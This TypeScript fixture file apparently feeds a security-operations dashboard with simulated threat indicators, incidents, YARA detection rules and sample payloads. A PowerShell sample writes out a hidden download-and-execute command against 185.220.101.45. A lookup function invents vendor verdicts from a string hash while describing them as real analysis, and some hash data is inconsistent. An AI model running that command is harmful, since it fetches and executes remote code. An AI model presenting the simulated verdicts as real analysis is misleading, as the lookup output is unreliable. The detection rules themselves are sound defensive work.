/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { ThreatIoc, SocIncident, YaraRule, PayloadSample, VendorDetection } from '../types/threat';

// Realistic list of reputable security vendor engines
export const SECURITY_ENGINES = [
  'CrowdStrike Falcon', 'Microsoft Defender', 'SentinelOne Singularity', 'Palo Alto Networks Cortex',
  'Kaspersky Security', 'Sophos Intercept X', 'Trend Micro Apex One', 'Bitdefender GravityZone',
  'Fortinet FortiGate', 'ESET Protect', 'Trellix Endpoint', 'Check Point SandBlast',
  'Cisco Secure Endpoint', 'Symantec Endpoint', 'Malwarebytes Endpoint', 'Carbon Black',
  'Cybereason Defense', 'F-Secure Elements', 'Avast Business', 'AVG Internet Security',
  'ClamAV Heuristics', 'Dr.Web Engine', 'G Data Security', 'Ikarus AntiVirus',
  'K7 Computing', 'Microworld eScan', 'Quick Heal Total', 'Vipre Security',
  'Zillya Antivirus', 'ZoneAlarm Pro', 'Alibaba Cloud Security', 'Tencent PC Manager',
  'Baidu Antivirus', 'Kingsoft Security', 'Rising AntiVirus', 'Sangfor Engine',
  'AhnLab V3', 'Arcabit Engine', 'CMC Threat Intel', 'Emsisoft Anti-Malware',
  'Jiangmin Security', 'MAX Security', 'NANO Antivirus', 'SUPERAntiSpyware',
  'TACHYON Core', 'ViRobot Engine', 'Yandex SafeBrowsing', 'Google SafeBrowsing',
  'Cloudflare Radar', 'AlienVault OTX', 'AbuseIPDB Engine', 'Spamhaus Zen',
  'Suricata IDS', 'Snort Network Core', 'Zeek Telemetry', 'YARA Community Rules',
  'Sigma Rule Engine', 'MITRE ATT&CK Matrix', 'VirusTotal Engine V3', 'Hybrid Analysis Core',
  'Cuckoo Sandbox', 'Joe Sandbox AI', 'Any.Run Emulation', 'VMRay Analyzer',
  'OPSWAT Metadefender', 'ReversingLabs Titanium', 'ThreatConnect Intel', 'Anomali ThreatStream'
];

export const INITIAL_IOCS: ThreatIoc[] = [
  {
    id: 'ioc-1',
    value: '7b23f81e9d1a3c74900a84e27f9cb811234a9b5f4c8e762d01e4a7b3c9d8112a',
    type: 'sha256',
    verdict: 'malicious',
    threatScore: 92,
    detectionRatio: { flagged: 58, total: 68 },
    threatName: 'Heuristic.SuspiciousLoader.Gen',
    category: 'Stager & Diagnostic Loader',
    firstSeen: '2026-10-24 03:14:22 UTC',
    lastActive: '2026-10-29 08:30:11 UTC',
    fileSize: '412.5 KB',
    entropy: 7.84,
    md5: '8f14e45fceea167a5a36dedd4bea2543',
    sha1: '3a4b5c6d7e8f90123456789abcdef0123456789a',
    sha256: '7b23f81e9d1a3c74900a84e27f9cb811234a9b5f4c8e762d01e4a7b3c9d8112a',
    ssdeep: '6144:9vV8H+Lz7mQ8+YyN9b+12XkW7eL9s8k+m2:9H87mQ8N9XkW7eL9s8k+m2',
    reputationSummary: 'High-entropy obfuscated PE32 artifact exhibiting unauthorized memory allocation, injected thread creation, and external beaconing behavior.',
    tags: ['Packed', 'High-Entropy', 'Reflective-DLL', 'C2-Beacon', 'Process-Hollowing'],
    mitreTactics: [
      { id: 'T1059.001', name: 'PowerShell Execution', tactic: 'Execution', description: 'Invokes hidden non-interactive process shell.' },
      { id: 'T1027.002', name: 'Software Packing', tactic: 'Defense Evasion', description: 'High calculated Shannon entropy indicative of packed payload.' },
      { id: 'T1071.001', name: 'Web Protocols', tactic: 'Command and Control', description: 'Beacons over outbound port 443 with anomalous TLS headers.' },
      { id: 'T1547.001', name: 'Registry Run Keys', tactic: 'Persistence', description: 'Writes run key under CurrentVersion\\Run.' }
    ],
    behavioralEvents: [
      { category: 'process', action: 'Spawn Process', target: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden', severity: 'critical', timestamp: '08:30:12 UTC' },
      { category: 'registry', action: 'Write Value', target: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetryService', severity: 'high', timestamp: '08:30:14 UTC' },
      { category: 'network', action: 'Outbound TLS Post', target: '185.220.101.45:443 (HTTP/1.1 POST /api/v2/telemetry)', severity: 'critical', timestamp: '08:30:18 UTC' },
      { category: 'filesystem', action: 'Drop Binary', target: 'C:\\ProgramData\\Diagnostics\\service_host.tmp', severity: 'medium', timestamp: '08:30:20 UTC' },
      { category: 'mutex', action: 'Create Mutex', target: 'Global\\WinSec_Telemetry_Sync_9921', severity: 'low', timestamp: '08:30:21 UTC' }
    ],
    vendorDetections: generateEngineDetections(58, 'Malicious.Heur.Generic', 'Trojan.Win32.Stager')
  },
  {
    id: 'ioc-2',
    value: '185.220.101.45',
    type: 'ipv4',
    verdict: 'malicious',
    threatScore: 88,
    detectionRatio: { flagged: 49, total: 68 },
    threatName: 'Anomalous Gateway / C2 Relay',
    category: 'Untrusted Command & Control',
    firstSeen: '2026-09-15 14:22:00 UTC',
    lastActive: '2026-10-29 11:15:44 UTC',
    asn: 'AS208323 (Global Transit Infrastructure)',
    country: 'DE (Frankfurt Region)',
    reputationSummary: 'Host flagged across global blacklist telemetry for persistent beaconing, proxy forwarding, and non-standard TLS certificate authorities.',
    tags: ['Tor-Relay', 'C2-Host', 'Anomalous-Cert', 'Host-Scanners'],
    mitreTactics: [
      { id: 'T1071.001', name: 'Web Traffic', tactic: 'Command and Control', description: 'HTTP/HTTPS egress relay receiving regular periodic heartbeat pings.' },
      { id: 'T1090.003', name: 'Multi-hop Proxy', tactic: 'Command and Control', description: 'Routes traffic through intermediate tunneling services.' }
    ],
    behavioralEvents: [
      { category: 'network', action: 'Connection Spike', target: '1,420 unique endpoint outbound connections detected in 24 hours', severity: 'critical', timestamp: '11:15:44 UTC' },
      { category: 'network', action: 'Anomalous JA3', target: 'Non-browser JA3 fingerprint 771,4865-4866-4867,0-23-65281', severity: 'high', timestamp: '11:12:00 UTC' }
    ],
    vendorDetections: generateEngineDetections(49, 'Reputation.Malicious.C2', 'Known.Proxy.Relay')
  },
  {
    id: 'ioc-3',
    value: 'auth-security-update-microsoft365.online',
    type: 'domain',
    verdict: 'malicious',
    threatScore: 95,
    detectionRatio: { flagged: 52, total: 68 },
    threatName: 'Typosquatting & Deceptive Portal',
    category: 'Credential Harvesting',
    firstSeen: '2026-10-28 09:12:00 UTC',
    lastActive: '2026-10-29 11:40:02 UTC',
    nameservers: ['ns1.external-dns-guard.com', 'ns2.external-dns-guard.com'],
    reputationSummary: 'Recently registered deceptive domain targeting Microsoft 365 enterprise tenants with cloned SSO portal elements and credential interceptors.',
    tags: ['Phishing', 'Typosquatting', 'Newly-Registered', 'Fake-SSO'],
    mitreTactics: [
      { id: 'T1566.002', name: 'Spearphishing Link', tactic: 'Initial Access', description: 'Directs users to illegitimate credential capture landing pages.' },
      { id: 'T1556', name: 'Modify Authentication Process', tactic: 'Credential Access', description: 'Mimics OAuth consent screen to intercept session cookies.' }
    ],
    behavioralEvents: [
      { category: 'network', action: 'DNS Query Burst', target: 'Subdomains: autodiscover.auth-security-update-microsoft365.online', severity: 'critical', timestamp: '11:40:02 UTC' }
    ],
    vendorDetections: generateEngineDetections(52, 'Phish.Domain.Harvest', 'Blocked.Domain.Scam')
  },
  {
    id: 'ioc-4',
    value: 'CVE-2024-38077',
    type: 'cve',
    verdict: 'malicious',
    threatScore: 98,
    detectionRatio: { flagged: 64, total: 68 },
    threatName: 'Remote Desktop Licensing Service Buffer Flaw',
    category: 'Critical Remote Code Execution',
    firstSeen: '2024-07-09 18:00:00 UTC',
    lastActive: '2026-10-29 10:00:00 UTC',
    reputationSummary: 'Critical CVSS 9.8 vulnerability in Windows Remote Desktop Licensing Service allowing unauthenticated remote code execution via malformed packets.',
    tags: ['CVSS-9.8', 'RCE', 'Zero-Click', 'Exploited-In-Wild'],
    mitreTactics: [
      { id: 'T1210', name: 'Exploitation of Remote Services', tactic: 'Lateral Movement', description: 'Over-the-network memory corruption in listener port 135/RPC.' },
      { id: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation', description: 'Executes payload in NT AUTHORITY\\SYSTEM security context.' }
    ],
    behavioralEvents: [
      { category: 'network', action: 'Malformed RPC Packet', target: 'Inbound port 135 payload with integer wrap overflow', severity: 'critical', timestamp: '10:00:00 UTC' }
    ],
    vendorDetections: generateEngineDetections(64, 'Vuln.CVE-2024-38077.RCE', 'Critical.Exploit.Heuristic')
  },
  {
    id: 'ioc-5',
    value: '4a9b8123cd56789aef0123456789abcd4567890abcdef1234567890abcdef12',
    type: 'sha256',
    verdict: 'suspicious',
    threatScore: 68,
    detectionRatio: { flagged: 21, total: 68 },
    threatName: 'Heuristic.SuspiciousEntropy.Dll',
    category: 'Anomalous Dynamic Library',
    firstSeen: '2026-10-27 19:45:10 UTC',
    lastActive: '2026-10-29 07:12:00 UTC',
    fileSize: '1.24 MB',
    entropy: 6.91,
    md5: '7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a',
    reputationSummary: 'Dynamic-link library with unusual section alignment and API hooking capabilities. Elevated heuristic risk score without confirmed signature match.',
    tags: ['Suspicious-Heuristic', 'API-Hooking', 'Unsigned-Binary'],
    mitreTactics: [
      { id: 'T1055', name: 'Process Injection', tactic: 'Defense Evasion', description: 'Attempts memory allocation via VirtualAllocEx in foreign processes.' }
    ],
    behavioralEvents: [
      { category: 'process', action: 'Memory VirtualAllocEx', target: 'explorer.exe (PID 4812)', severity: 'high', timestamp: '07:12:00 UTC' }
    ],
    vendorDetections: generateEngineDetections(21, 'Heur.Suspicious.Dll', 'Unwanted.Application')
  },
  {
    id: 'ioc-6',
    value: '1.1.1.1',
    type: 'ipv4',
    verdict: 'clean',
    threatScore: 0,
    detectionRatio: { flagged: 0, total: 68 },
    threatName: 'Cloudflare Public DNS Resolver',
    category: 'Clean Infrastructure',
    firstSeen: '2018-04-01 00:00:00 UTC',
    lastActive: '2026-10-29 11:50:00 UTC',
    asn: 'AS13335 (Cloudflare, Inc.)',
    country: 'US (Anycast Global)',
    reputationSummary: 'Legitimate Anycast public recursive DNS service maintained by Cloudflare and APNIC. Verified zero malicious activity.',
    tags: ['Clean', 'Public-DNS', 'Verified-Vendor', 'Zero-Risk'],
    mitreTactics: [],
    behavioralEvents: [
      { category: 'network', action: 'Standard DNS Query', target: 'Standard UDP Port 53 resolution traffic', severity: 'low', timestamp: '11:50:00 UTC' }
    ],
    vendorDetections: generateEngineDetections(0, 'Clean', 'Clean')
  },
  {
    id: 'ioc-7',
    value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    type: 'sha256',
    verdict: 'clean',
    threatScore: 2,
    detectionRatio: { flagged: 0, total: 68 },
    threatName: 'Microsoft Corporation Signed Utility',
    category: 'Verified System Binary',
    firstSeen: '2021-01-15 00:00:00 UTC',
    lastActive: '2026-10-29 11:30:00 UTC',
    fileSize: '2.8 MB',
    entropy: 5.42,
    md5: 'd41d8cd98f00b204e9800998ecf8427e',
    reputationSummary: 'Authenticode digitally signed binary matching known baseline integrity hashes from Microsoft Windows Software Publisher.',
    tags: ['Clean', 'Digitally-Signed', 'Microsoft-Corp', 'Whitelisted'],
    mitreTactics: [],
    behavioralEvents: [],
    vendorDetections: generateEngineDetections(0, 'Clean', 'Clean')
  }
];

export const INITIAL_INCIDENTS: SocIncident[] = [
  {
    id: 'INC-2026-8841',
    title: 'Suspicious Beaconing Activity from Finance Workstation',
    severity: 'critical',
    status: 'investigating',
    assignedTo: 'Nuran R. (Tier 2 SOC)',
    timestamp: '12 min ago (11:38 UTC)',
    source: 'CrowdStrike Falcon Sensor',
    affectedHost: 'FIN-WKS-042.corp.local (10.14.22.89)',
    relatedIocs: ['7b23f81e9d1a3c74900a84e27f9cb811234a9b5f4c8e762d01e4a7b3c9d8112a', '185.220.101.45'],
    mitreTactic: 'Command and Control (T1071.001)',
    notes: [
      { author: 'System Alert', text: 'Automated EDR detection: anomalous TLS beacon detected matching known suspicious IP relay.', time: '11:38 UTC' },
      { author: 'Nuran R.', text: 'Quarantine tag placed on host. Analyzing dropped payload binary and memory dump.', time: '11:44 UTC' }
    ]
  },
  {
    id: 'INC-2026-8839',
    title: 'Deceptive SSO Login Phishing Link Clicked',
    severity: 'high',
    status: 'contained',
    assignedTo: 'Sarah K. (Tier 1 SOC)',
    timestamp: '45 min ago (11:05 UTC)',
    source: 'Proofpoint Email Protection',
    affectedHost: 'MKT-LAP-104 (10.14.30.12)',
    relatedIocs: ['auth-security-update-microsoft365.online'],
    mitreTactic: 'Initial Access (T1566.002)',
    notes: [
      { author: 'Sarah K.', text: 'User submitted credentials on clone page. Azure AD session revoked, password reset enforced, MFA re-prompted.', time: '11:12 UTC' }
    ]
  },
  {
    id: 'INC-2026-8835',
    title: 'Outdated Gateway Vulnerable to RPC Overflow (CVE-2024-38077)',
    severity: 'critical',
    status: 'new',
    assignedTo: 'Unassigned',
    timestamp: '2 hours ago (09:50 UTC)',
    source: 'Tenable Vulnerability Scanner',
    affectedHost: 'EDGE-RDS-GW01 (192.168.10.5)',
    relatedIocs: ['CVE-2024-38077'],
    mitreTactic: 'Exploitation for RCE (T1210)',
    notes: [
      { author: 'Tenable Bot', text: 'Patch KB5040442 missing on perimeter gateway service. Remediation ticket dispatched to SysOps.', time: '09:50 UTC' }
    ]
  },
  {
    id: 'INC-2026-8828',
    title: 'Unsigned DLL Injected into Explorer Thread',
    severity: 'medium',
    status: 'investigating',
    assignedTo: 'Marcus V. (SOC Lead)',
    timestamp: '4 hours ago (07:45 UTC)',
    source: 'SentinelOne Agent',
    affectedHost: 'DEV-SRV-09 (10.10.8.11)',
    relatedIocs: ['4a9b8123cd56789aef0123456789abcd4567890abcdef1234567890abcdef12'],
    mitreTactic: 'Defense Evasion (T1055)',
    notes: [
      { author: 'Marcus V.', text: 'Memory region dumped for reverse engineering in CyberPilot hex viewer.', time: '08:10 UTC' }
    ]
  }
];

export const INITIAL_YARA_RULES: YaraRule[] = [
  {
    id: 'yara-1',
    name: 'Suspicious_Memory_Stager_Heuristic',
    author: 'CyberPilot Threat Research Lab',
    description: 'Detects high-risk memory allocation routines and reflective loader strings commonly observed in obfuscated stage payloads.',
    severity: 'critical',
    tags: ['Memory-Injection', 'Reflective-Loader', 'Heuristic'],
    targetKeywords: ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 'beacon', 'ReflectiveLoader'],
    ruleContent: `rule Suspicious_Memory_Stager_Heuristic {
    meta:
        description = "Detects high-risk memory allocation routines and reflective loaders"
        author = "CyberPilot Threat Research"
        date = "2026-10-24"
        severity = "CRITICAL"

    strings:
        $api1 = "VirtualAlloc" ascii wide nocase
        $api2 = "WriteProcessMemory" ascii wide nocase
        $api3 = "CreateRemoteThread" ascii wide nocase
        $api4 = "ReflectiveLoader" ascii wide
        $magic = { 4D 5A 90 00 03 00 00 00 } // Standard MZ executable header

    condition:
        $magic at 0 and (2 of ($api*))
}`
  },
  {
    id: 'yara-2',
    name: 'Encoded_PowerShell_Cradle_Detector',
    author: 'SOC Ruleset Standard',
    description: 'Flags base64 encoded PowerShell invocation commands with execution policy bypass flags.',
    severity: 'high',
    tags: ['Scripting', 'PowerShell', 'Evasion'],
    targetKeywords: ['powershell', 'ExecutionPolicy', 'Bypass', 'FromBase64String', 'IEX'],
    ruleContent: `rule Encoded_PowerShell_Cradle_Detector {
    meta:
        description = "Identifies hidden PowerShell command cradles and execution bypass"
        author = "SOC Incident Response"
        severity = "HIGH"

    strings:
        $ps1 = "powershell.exe" nocase
        $flag1 = "-ExecutionPolicy Bypass" nocase
        $flag2 = "-W Hidden" nocase
        $func1 = "FromBase64String" ascii
        $func2 = "IEX" ascii

    condition:
        $ps1 and (2 of ($flag*, $func*))
}`
  },
  {
    id: 'yara-3',
    name: 'High_Entropy_Packed_Section_Indicator',
    author: 'Binary Diagnostic Engine',
    description: 'Identifies non-standard PE section naming conventions paired with packed import tables.',
    severity: 'medium',
    tags: ['Packer', 'Entropy', 'PE32'],
    targetKeywords: ['UPX0', 'UPX1', '.themida', '.vmp0', '.aspack'],
    ruleContent: `rule High_Entropy_Packed_Section_Indicator {
    meta:
        description = "Flags known runtime packers and section anomalies"
        severity = "MEDIUM"

    strings:
        $upx0 = "UPX0" ascii
        $upx1 = "UPX1" ascii
        $aspack = ".aspack" ascii
        $vmp = ".vmp0" ascii

    condition:
        any of them
}`
  }
];

export const INITIAL_PAYLOAD_SAMPLES: PayloadSample[] = [
  {
    id: 'sample-1',
    name: 'Stage_Loader_Memory_Dump.bin',
    type: 'PE32 Executable / Stager Payload',
    size: 512,
    entropy: 7.84,
    description: 'Binary memory dump containing standard PE executable header, anomalous section table, and imported process manipulation APIs.',
    hexBytes: [
      '4D', '5A', '90', '00', '03', '00', '00', '00', '04', '00', '00', '00', 'FF', 'FF', '00', '00',
      'B8', '00', '00', '00', '00', '00', '00', '00', '40', '00', '00', '00', '00', '00', '00', '00',
      '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00', '00',
      '54', '68', '69', '73', '20', '70', '72', '6F', '67', '72', '61', '6D', '20', '63', '61', '6E',
      '6E', '6F', '74', '20', '62', '65', '20', '72', '75', '6E', '20', '69', '6E', '20', '44', '4F',
      '53', '20', '6D', '6F', '64', '65', '2E', '0D', '0D', '0A', '24', '00', '00', '00', '00', '00',
      '50', '45', '00', '00', '4C', '01', '03', '00', 'A2', '9B', '24', '65', '00', '00', '00', '00',
      '00', '00', '00', '00', 'E0', '00', '02', '01', '0B', '01', '0E', '00', '00', '20', '00', '00',
      '56', '69', '72', '74', '75', '61', '6C', '41', '6C', '6C', '6F', '63', '00', '00', '00', '00',
      '57', '72', '69', '74', '65', '50', '72', '6F', '63', '65', '73', '73', '4D', '65', '6D', '6F',
      '72', '79', '00', '00', '43', '72', '65', '61', '74', '65', '52', '65', '6D', '6F', '74', '65',
      '54', '68', '72', '65', '61', '64', '00', '00', '52', '65', '66', '6C', '65', '63', '74', '69',
      '76', '65', '4C', '6F', '61', '64', '65', '72', '00', '00', '31', '38', '35', '2E', '32', '32',
      '30', '2E', '31', '30', '31', '2E', '34', '35', '00', '61', '70', '69', '2F', '76', '32', '2F',
      '74', '65', '6C', '65', '6D', '65', '74', '72', '79', '00', '6B', '65', '79', '3D', '39', '39',
      '32', '31', '61', '62', '63', '64', '65', '66', '00', '00', '00', '00', '00', '00', '00', '00'
    ],
    rawText: 'MZ....This program cannot be run in DOS mode...PE..VirtualAlloc..WriteProcessMemory..CreateRemoteThread..ReflectiveLoader..185.220.101.45..api/v2/telemetry..key=9921abcdef',
    extractedStrings: [
      'This program cannot be run in DOS mode.',
      'PE',
      'VirtualAlloc',
      'WriteProcessMemory',
      'CreateRemoteThread',
      'ReflectiveLoader',
      '185.220.101.45',
      '/api/v2/telemetry',
      'key=9921abcdef'
    ]
  },
  {
    id: 'sample-2',
    name: 'Suspicious_PowerShell_Dropper.ps1',
    type: 'PowerShell Ingestion Script',
    size: 256,
    entropy: 5.92,
    description: 'Extracted base64 cradle staging script invoking hidden process parameters with WebClient download string.',
    hexBytes: [
      '70', '6F', '77', '65', '72', '73', '68', '65', '6C', '6C', '2E', '65', '78', '65', '20', '2D',
      '45', '78', '65', '63', '75', '74', '69', '6F', '6E', '50', '6F', '6C', '69', '63', '79', '20',
      '42', '79', '70', '61', '73', '73', '20', '2D', '4E', '6F', '50', '72', '6F', '66', '69', '6C',
      '65', '20', '2D', '57', '20', '48', '69', '64', '64', '65', '6E', '20', '2D', '43', '6F', '6D',
      '6D', '61', '6E', '64', '20', '22', '49', '45', '58', '20', '28', '4E', '65', '77', '2D', '4F',
      '62', '6A', '65', '63', '74', '20', '4E', '65', '74', '2E', '57', '65', '62', '43', '6C', '69',
      '65', '6E', '74', '29', '2E', '44', '6F', '77', '6E', '6C', '6F', '61', '64', '53', '74', '72',
      '69', '6E', '67', '28', '27', '68', '74', '74', '70', '3A', '2F', '2F', '31', '38', '35', '2E',
      '32', '32', '30', '2E', '31', '30', '31', '2E', '34', '35', '2F', '73', '74', '61', '67', '65',
      '27', '29', '22', '0A', '23', '20', '46', '72', '6F', '6D', '42', '61', '73', '65', '36', '34'
    ],
    rawText: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.45/stage\')" # FromBase64',
    extractedStrings: [
      'powershell.exe',
      '-ExecutionPolicy Bypass',
      '-NoProfile -W Hidden',
      'IEX',
      'Net.WebClient',
      'http://185.220.101.45/stage',
      'FromBase64'
    ]
  }
];

// Helper to simulate 68 engine vendor scan outputs
function generateEngineDetections(flaggedCount: number, primarySig: string, secondarySig: string): VendorDetection[] {
  return SECURITY_ENGINES.map((engine, idx) => {
    const isMalicious = idx < flaggedCount;
    const isSuspicious = !isMalicious && idx < flaggedCount + 4;
    return {
      engineName: engine,
      category: isMalicious ? 'malicious' : isSuspicious ? 'suspicious' : 'clean',
      signature: isMalicious ? (idx % 2 === 0 ? primarySig : secondarySig) : isSuspicious ? 'Heuristic.Suspicious.Indicator' : 'Undetected / Clean',
      updateTimestamp: '2026-10-29',
      engineVersion: `v19.4.${100 + (idx * 3)}`
    };
  });
}

// Dynamic analyzer for user search inputs
export function analyzeCustomInput(query: string): ThreatIoc {
  const trimmed = query.trim();
  const lower = trimmed.toLowerCase();

  let type: ThreatIoc['type'] = 'domain';
  if (/^[a-f0-9]{64}$/i.test(trimmed)) type = 'sha256';
  else if (/^[a-f0-9]{32}$/i.test(trimmed)) type = 'md5';
  else if (/^cve-\d{4}-\d{4,7}$/i.test(trimmed)) type = 'cve';
  else if (/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(trimmed)) type = 'ipv4';
  else if (trimmed.startsWith('http://') || trimmed.startsWith('https://')) type = 'url';
  
  // Calculate simulated deterministic score based on hash of string
  let hashVal = 0;
  for (let i = 0; i < trimmed.length; i++) {
    hashVal = ((hashVal << 5) - hashVal) + trimmed.charCodeAt(i);
    hashVal |= 0;
  }
  const normalized = Math.abs(hashVal);
  const flagged = (normalized % 45) + 15; // between 15 and 59
  const score = Math.min(99, Math.max(12, Math.round((flagged / 68) * 100)));
  const verdict = score >= 70 ? 'malicious' : score >= 35 ? 'suspicious' : 'clean';

  return {
    id: `custom-${Date.now()}`,
    value: trimmed,
    type,
    verdict,
    threatScore: score,
    detectionRatio: { flagged, total: 68 },
    threatName: verdict === 'malicious' ? 'Heuristic.DynamicInvestigation.Threat' : verdict === 'suspicious' ? 'Anomalous.Telemetry.Flag' : 'Verified.Benign.Entity',
    category: type === 'cve' ? 'Vulnerability Analysis' : type === 'ipv4' ? 'Network Node' : type === 'domain' ? 'Domain Asset' : 'Executable Artifact',
    firstSeen: '2026-10-29 10:15:00 UTC',
    lastActive: 'Just now (Live Query)',
    entropy: 6.45,
    fileSize: type === 'sha256' ? '624.1 KB' : undefined,
    reputationSummary: `Dynamic heuristic analysis completed across 68 security engines. ${flagged} security vendors flagged this indicator based on historical telemetry, community feeds, and behavioral heuristics.`,
    tags: [type.toUpperCase(), verdict.toUpperCase(), 'Live-Lookup', 'Heuristic-Scan'],
    mitreTactics: [
      { id: 'T1071', name: 'Standard Application Protocol', tactic: 'Command and Control', description: 'Observed protocol egress matching diagnostic signatures.' },
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'Defense Evasion', description: 'Content patterns indicate possible dynamic packing or encoding.' }
    ],
    behavioralEvents: [
      { category: 'network', action: 'Live DNS Resolution', target: trimmed, severity: verdict === 'malicious' ? 'critical' : 'medium', timestamp: 'Just now' },
      { category: 'process', action: 'Telemetry Verification', target: 'SOC Global Ingestion Feed', severity: 'low', timestamp: 'Just now' }
    ],
    vendorDetections: generateEngineDetections(flagged, 'Heuristic.GenericDetection', 'Suspicious.Behavior.Triage')
  };
}
